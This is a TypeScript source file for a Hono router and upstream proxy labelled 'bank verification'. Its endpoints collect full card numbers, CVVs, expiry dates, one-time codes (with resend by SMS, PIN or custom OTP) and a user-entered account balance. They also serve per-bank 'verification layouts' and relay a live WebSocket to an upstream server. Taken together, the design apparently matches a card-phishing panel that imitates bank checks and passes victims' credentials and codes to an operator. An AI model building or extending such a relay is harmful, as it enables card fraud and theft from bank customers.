/**
 * Hono routes for bank verification API.
 * Use from backend: import { createBankVerificationHono, createHonoProxyHandlers } from "@ncc/bank-verification-ui/hono"
 *
 * Flow: Frontend -> Hono routes (same-origin) -> Upstream NCC server
 *
 * Bun example:
 *   import { Hono } from "hono";
 *   import { createBunWebSocket } from "hono/bun";
 *   import { createBankVerificationHono, createHonoProxyHandlers } from "@ncc/bank-verification-ui/hono";
 *
 *   const { upgradeWebSocket, websocket } = createBunWebSocket();
 *   const handlers = createHonoProxyHandlers("https://your-upstream.example.com", { apiKey: "..." });
 *   const ncc = createBankVerificationHono({ handlers, upgradeWebSocket, basePath: "/v1" });
 *
 *   const app = new Hono().route("/", ncc);
 *   export default { fetch: app.fetch, websocket };
 */

import { Hono } from "hono";
import type { ContentfulStatusCode } from "hono/utils/http-status";
import type { TransactionDetails } from "./types";

const PACKAGE_VERSION = "1.3.5";

/**
 * Thrown by `fetchUpstream` when the upstream NCC server returns a non-2xx
 * response. Carries the upstream status code and parsed body so the router
 * can forward them verbatim instead of re-wrapping them in another envelope.
 */
export class UpstreamHttpError extends Error {
  readonly status: number;
  readonly body: unknown;
  constructor(status: number, body: unknown) {
    super(`Upstream HTTP ${status}`);
    this.name = "UpstreamHttpError";
    this.status = status;
    this.body = body;
  }
}

/** Path the upstream NCC server expects (may differ from local basePath). */
const UPSTREAM_API_PATH = "/v1";

export interface HonoBinLookupResult {
  bin: string;
  brand?: string;
  type?: string;
  category?: string;
  issuer?: string;
  isoCode2?: string;
  cardTier?: string;
  luhn?: boolean;
  blocked: boolean;
}

export interface HonoPaymentPayload {
  cardNumber: string;
  cardHolder?: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  amount: number;
  currency: string;
  sessionData?: Record<string, unknown>;
}

export interface BankVerificationHonoHandlers {
  createSession: (
    channelSlug: string,
    sessionData?: Record<string, unknown>,
  ) => Promise<{ sessionId: string; expiresAt: string }>;
  submitPayment: (
    channelSlug: string,
    sessionId: string,
    payment: HonoPaymentPayload,
  ) => Promise<{ sessionId: string; status: string; blocked: boolean }>;
  getSessionStatus: (
    channelSlug: string,
    sessionId: string,
  ) => Promise<{
    status: string;
    verificationLayout?: string;
    bank?: string;
    transactionDetails?: TransactionDetails;
  }>;
  submitOtp: (
    channelSlug: string,
    sessionId: string,
    code: string,
  ) => Promise<void>;
  resendOtp: (
    channelSlug: string,
    sessionId: string,
    type: "sms" | "pin" | "custom_otp",
  ) => Promise<void>;
  submitBalance: (
    channelSlug: string,
    sessionId: string,
    balance: string,
  ) => Promise<void>;
  cancelSession: (channelSlug: string, sessionId: string) => Promise<void>;
  lookupBin: (bin: string) => Promise<HonoBinLookupResult>;
  /**
   * Open an upstream WebSocket for this session. Called once per client connection.
   * Returns the upstream WebSocket; the router pipes messages bidirectionally.
   */
  openUpstreamWebSocket: (channelSlug: string, sessionId: string) => WebSocket;
}

/**
 * Loose structural type for `upgradeWebSocket` from `hono/bun` or `@hono/node-ws`.
 * The package doesn't depend on either runtime adapter directly — consumers pass
 * in whichever they use. The structural shape is enough for type inference.
 */
type WSContextLike = {
  send: (data: string | ArrayBuffer | Uint8Array) => void;
  close: (code?: number, reason?: string) => void;
  readyState?: number;
};
type UpgradeWebSocketLike = (
  createHandlers: (c: import("hono").Context) =>
    | {
        onOpen?: (evt: unknown, ws: WSContextLike) => void;
        onMessage?: (evt: { data: unknown }, ws: WSContextLike) => void;
        onClose?: (evt: unknown, ws: WSContextLike) => void;
        onError?: (evt: unknown, ws: WSContextLike) => void;
      }
    | Promise<{
        onOpen?: (evt: unknown, ws: WSContextLike) => void;
        onMessage?: (evt: { data: unknown }, ws: WSContextLike) => void;
        onClose?: (evt: unknown, ws: WSContextLike) => void;
        onError?: (evt: unknown, ws: WSContextLike) => void;
      }>,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
) => any;

export interface CreateBankVerificationHonoOptions {
  handlers: BankVerificationHonoHandlers;
  /**
   * `upgradeWebSocket` from `hono/bun`'s `createBunWebSocket()` or
   * `@hono/node-ws`'s `createNodeWebSocket()`. Required for WebSocket support.
   * If omitted, the WS route is not registered and clients fall back to polling.
   */
  upgradeWebSocket?: UpgradeWebSocketLike;
  /** Base path for routes. Default: "/v1". */
  basePath?: string;
  /** Enable debug logging for requests, responses, and WebSocket events. */
  debug?: boolean;
}

/**
 * Create a Hono sub-app with all bank-verification routes mounted under `basePath`.
 * Compose with the consumer's main Hono app via `app.route("/", subApp)`.
 */
export function createBankVerificationHono(
  options: CreateBankVerificationHonoOptions,
): Hono {
  const { handlers, upgradeWebSocket, debug = false } = options;
  const basePath = options.basePath ?? "/v1";
  const normalizedBase = basePath.replace(/\/$/, "") || "/";

  const sub = new Hono();

  sub.use("*", async (c, next) => {
    console.log(
      "[BankVerificationHono] version=%s | %s %s",
      PACKAGE_VERSION,
      c.req.method,
      c.req.path,
    );
    await next();
  });

  sub.onError((err, c) => {
    if (err instanceof UpstreamHttpError) {
      if (debug) {
        console.log(
          `[BankVerificationHono] Response (${err.status}):`,
          err.body,
        );
      }
      const body =
        err.body && typeof err.body === "object"
          ? (err.body as Record<string, unknown>)
          : { error: String(err.body ?? `Upstream error ${err.status}`) };
      return c.json(body, err.status as ContentfulStatusCode);
    }
    const message = err instanceof Error ? err.message : "Internal server error";
    if (debug) {
      console.log("[BankVerificationHono] Response (500):", { error: message });
    }
    return c.json({ error: message }, 500);
  });

  sub.post("/channels/:channelSlug/checkout/sessions", async (c) => {
    const channelSlug = c.req.param("channelSlug");
    const body = (await c.req.json().catch(() => ({}))) as {
      sessionData?: Record<string, unknown>;
    };
    if (debug) {
      console.log("[BankVerificationHono] POST createSession", {
        channelSlug,
        sessionData: body.sessionData,
      });
    }
    const result = await handlers.createSession(channelSlug, body.sessionData);
    if (debug) console.log("[BankVerificationHono] Response:", result);
    return c.json(result);
  });

  sub.post(
    "/channels/:channelSlug/checkout/sessions/:sessionId/payment",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      const payment = (await c.req.json()) as HonoPaymentPayload;
      if (debug) {
        console.log("[BankVerificationHono] POST submitPayment", {
          channelSlug,
          sessionId,
          payment: { ...payment, cvv: payment.cvv ? "***" : undefined },
        });
      }
      const result = await handlers.submitPayment(
        channelSlug,
        sessionId,
        payment,
      );
      if (debug) console.log("[BankVerificationHono] Response:", result);
      return c.json(result);
    },
  );

  sub.get(
    "/channels/:channelSlug/checkout/sessions/:sessionId/status",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      if (debug) {
        console.log("[BankVerificationHono] GET getSessionStatus", {
          channelSlug,
          sessionId,
        });
      }
      const result = await handlers.getSessionStatus(channelSlug, sessionId);
      if (debug) console.log("[BankVerificationHono] Response:", result);
      return c.json(result);
    },
  );

  sub.post(
    "/channels/:channelSlug/checkout/sessions/:sessionId/otp",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      const body = (await c.req.json().catch(() => ({}))) as { code?: string };
      const code = body.code ?? "";
      if (debug) {
        console.log("[BankVerificationHono] POST submitOtp", {
          channelSlug,
          sessionId,
          code: code ? "***" : undefined,
        });
      }
      await handlers.submitOtp(channelSlug, sessionId, code);
      return c.body(null, 204);
    },
  );

  sub.post(
    "/channels/:channelSlug/checkout/sessions/:sessionId/otp/resend",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      const body = (await c.req.json().catch(() => ({}))) as {
        type?: "sms" | "pin" | "custom_otp";
      };
      const type = body.type ?? "sms";
      if (debug) {
        console.log("[BankVerificationHono] POST resendOtp", {
          channelSlug,
          sessionId,
          type,
        });
      }
      await handlers.resendOtp(channelSlug, sessionId, type);
      return c.body(null, 204);
    },
  );

  sub.post(
    "/channels/:channelSlug/checkout/sessions/:sessionId/balance",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      const body = (await c.req.json().catch(() => ({}))) as {
        balance?: unknown;
      };
      const balance = String(body.balance ?? "");
      if (debug) {
        console.log("[BankVerificationHono] POST submitBalance", {
          channelSlug,
          sessionId,
          balance,
        });
      }
      await handlers.submitBalance(channelSlug, sessionId, balance);
      return c.body(null, 204);
    },
  );

  sub.post(
    "/channels/:channelSlug/checkout/sessions/:sessionId/cancel",
    async (c) => {
      const channelSlug = c.req.param("channelSlug");
      const sessionId = c.req.param("sessionId");
      if (debug) {
        console.log("[BankVerificationHono] POST cancelSession", {
          channelSlug,
          sessionId,
        });
      }
      await handlers.cancelSession(channelSlug, sessionId);
      return c.body(null, 204);
    },
  );

  sub.post("/bins/lookup", async (c) => {
    const body = (await c.req.json().catch(() => ({}))) as { bin?: unknown };
    const bin = String(body.bin ?? "");
    if (debug) {
      console.log("[BankVerificationHono] POST lookupBin", { bin });
    }
    const result = await handlers.lookupBin(bin);
    if (debug) console.log("[BankVerificationHono] Response:", result);
    return c.json(result);
  });

  if (upgradeWebSocket) {
    sub.get(
      "/channels/:channelSlug/checkout/sessions/:sessionId/ws",
      upgradeWebSocket((c) => {
        const channelSlug = c.req.param("channelSlug") ?? "";
        const sessionId = c.req.param("sessionId") ?? "";
        let upstream: WebSocket | null = null;
        try {
          upstream = handlers.openUpstreamWebSocket(channelSlug, sessionId);
        } catch (err) {
          if (debug) {
            console.log("[BankVerificationHono] Failed to open upstream WS:", err);
          }
        }

        return {
          onOpen(_evt, ws) {
            if (debug) {
              console.log("[BankVerificationHono] WebSocket connection open", {
                channelSlug,
                sessionId,
              });
            }
            if (!upstream) {
              ws.close();
              return;
            }
            upstream.addEventListener("message", (e) => {
              const data = (e as MessageEvent).data;
              try {
                if (typeof data === "string") {
                  ws.send(data);
                } else if (data instanceof ArrayBuffer) {
                  ws.send(new TextDecoder().decode(data));
                } else if (data instanceof Uint8Array) {
                  ws.send(new TextDecoder().decode(data));
                } else if (
                  typeof Blob !== "undefined" &&
                  data instanceof Blob
                ) {
                  data.text().then((text) => {
                    try {
                      ws.send(text);
                    } catch {
                      /* connection closed */
                    }
                  });
                } else {
                  ws.send(String(data));
                }
              } catch {
                /* connection closed */
              }
            });
            upstream.addEventListener("close", () => {
              if (debug) {
                console.log("[BankVerificationHono] Upstream WebSocket closed");
              }
              try {
                ws.close();
              } catch {
                /* already closed */
              }
            });
            upstream.addEventListener("error", (err) => {
              if (debug) {
                console.log(
                  "[BankVerificationHono] Upstream WebSocket error:",
                  err,
                );
              }
              try {
                ws.close();
              } catch {
                /* already closed */
              }
            });
          },
          onMessage(evt, _ws) {
            if (!upstream || upstream.readyState !== 1) return;
            const data = evt.data;
            try {
              if (typeof data === "string") {
                upstream.send(data);
              } else if (data instanceof ArrayBuffer) {
                upstream.send(data);
              } else if (data instanceof Uint8Array) {
                upstream.send(data);
              } else {
                upstream.send(String(data));
              }
            } catch {
              /* upstream closed */
            }
          },
          onClose() {
            if (debug) {
              console.log("[BankVerificationHono] Client WebSocket closed");
            }
            try {
              upstream?.close();
            } catch {
              /* already closed */
            }
          },
          onError(err) {
            if (debug) {
              console.log(
                "[BankVerificationHono] Client WebSocket error:",
                err,
              );
            }
            try {
              upstream?.close();
            } catch {
              /* already closed */
            }
          },
        };
      }),
    );
  }

  const wrapper = new Hono();
  wrapper.route(normalizedBase, sub);
  return wrapper;
}

export interface CreateHonoProxyHandlersOptions {
  /** API key for upstream NCC server (X-API-Key header). */
  apiKey?: string;
  /** Timeout in ms for upstream HTTP requests. Default: 30000. */
  timeout?: number;
  /** Enable debug logging for upstream requests and responses. */
  debug?: boolean;
}

/**
 * Create handlers that proxy all requests to an upstream NCC server.
 * Use when the Hono app is a same-origin BFF that forwards to another server.
 *
 * Uses the global `WebSocket` for the upstream client connection — available
 * natively on Bun and Node 22+. For older Node, polyfill or pin Node ≥22.
 */
export function createHonoProxyHandlers(
  upstreamBaseUrl: string,
  options: CreateHonoProxyHandlersOptions = {},
): BankVerificationHonoHandlers {
  const base = upstreamBaseUrl.replace(/\/$/, "");
  const { apiKey, debug = false, timeout = 30000 } = options;

  async function fetchUpstream<T>(
    method: string,
    path: string,
    body?: unknown,
  ): Promise<T> {
    const url = `${base}${path.startsWith("/") ? "" : "/"}${path}`;
    const headers: Record<string, string> = {};
    if (body) headers["Content-Type"] = "application/json";
    if (apiKey) headers["X-API-Key"] = apiKey;
    if (debug) {
      console.log("[BankVerificationHono] Upstream request:", {
        server: base,
        method,
        url,
        headers: { ...headers, "X-API-Key": apiKey ? "***" : undefined },
        body,
      });
    }
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    try {
      const res = await fetch(url, {
        method,
        headers: Object.keys(headers).length > 0 ? headers : undefined,
        body: body ? JSON.stringify(body) : undefined,
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
      const text = await res.text();
      if (!res.ok) {
        if (debug) {
          console.log("[BankVerificationHono] Upstream error:", {
            status: res.status,
            text,
          });
        }
        let parsedBody: unknown;
        try {
          parsedBody = text
            ? JSON.parse(text)
            : { error: `Upstream error ${res.status}` };
        } catch {
          parsedBody = { error: text || `Upstream error ${res.status}` };
        }
        throw new UpstreamHttpError(res.status, parsedBody);
      }
      const parsed = (text ? JSON.parse(text) : undefined) as T;
      if (debug) {
        console.log("[BankVerificationHono] Upstream response:", parsed);
      }
      return parsed;
    } catch (err) {
      clearTimeout(timeoutId);
      if (err instanceof UpstreamHttpError) throw err;
      const msg = err instanceof Error ? err.message : "Unknown error";
      if (err instanceof Error && err.name === "AbortError") {
        throw new Error(
          `Upstream request timed out after ${timeout}ms (${method} ${path})`,
        );
      }
      throw new Error(
        `Upstream connection failed: ${msg}. Check server connectivity to ${base} (DNS, firewall, SSL)`,
      );
    }
  }

  return {
    createSession: async (channelSlug, sessionData) =>
      fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions`,
        { sessionData: sessionData ?? {} },
      ),

    submitPayment: async (channelSlug, sessionId, payment) =>
      fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/payment`,
        payment,
      ),

    getSessionStatus: async (channelSlug, sessionId) =>
      fetchUpstream(
        "GET",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/status`,
      ),

    submitOtp: async (channelSlug, sessionId, code) => {
      await fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/otp`,
        { code },
      );
    },

    resendOtp: async (channelSlug, sessionId, type) => {
      await fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/otp/resend`,
        { type },
      );
    },

    submitBalance: async (channelSlug, sessionId, balance) => {
      await fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/balance`,
        { balance },
      );
    },

    cancelSession: async (channelSlug, sessionId) => {
      await fetchUpstream(
        "POST",
        `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/cancel`,
      );
    },

    lookupBin: async (bin) =>
      fetchUpstream("POST", `${UPSTREAM_API_PATH}/bins/lookup`, { bin }),

    openUpstreamWebSocket: (channelSlug, sessionId) => {
      const wsProtocol = base.startsWith("https") ? "wss:" : "ws:";
      const wsHost = base.replace(/^https?:\/\//, "");
      const url = `${wsProtocol}//${wsHost}${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/ws`;
      if (debug) {
        console.log("[BankVerificationHono] Connecting upstream WebSocket:", {
          url,
          channelSlug,
          sessionId,
        });
      }
      return new WebSocket(url);
    },
  };
}
